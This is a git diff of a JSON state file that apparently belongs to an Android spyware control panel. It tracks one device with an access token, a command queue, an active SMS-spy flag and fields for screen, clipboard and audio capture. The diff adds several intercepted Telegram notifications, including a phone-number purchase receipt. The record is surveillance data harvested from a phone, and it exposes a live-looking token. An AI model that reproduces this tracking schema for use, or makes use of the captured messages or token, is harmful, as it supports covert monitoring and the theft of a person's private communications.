@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777061626635,
+    "lastSeen": 1777061638651,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "OSINT_INSPECTOR",
+        "content": "HELLO EVERYONE, THIS IS A FREE OSINT BOT, KEEP UPDATED, GOOD LUCK TRYING\nHALLO SEMUA INI BOT OSINT FREE UPDATE TERUS YAH SELAMAT MENCOBA",
+        "time": "25/04 03:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061628999
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******16\n• Waktu: 25/04/2026, 03.13",
+        "time": "25/04 03:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061628884
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ ubilll・14914 pesan baru dari 126 obrolan",
+        "time": "25/04 03:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061628875
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "\n✅ [AUTO-CHECK CPU] - V1 ✅\n\nTotal Server yang Dicek: 17\n\nSemua server yang dicek berada dalam batas CPU wajar.",
+        "time": "25/04 03:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061628867
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******16\n• Waktu: 25/04/2026, 03.13",
+        "time": "25/04 03:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061628849
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -77,7 +117,10 @@
     "lastClipboard": null,
     "lastAudio": null,
     "audioList": [],
-    "lastAppUsage": null,
+    "lastAppUsage": {
+      "apps": [],
+      "receivedAt": 1777061638756
+    },
     "appList": null
   }
 ]
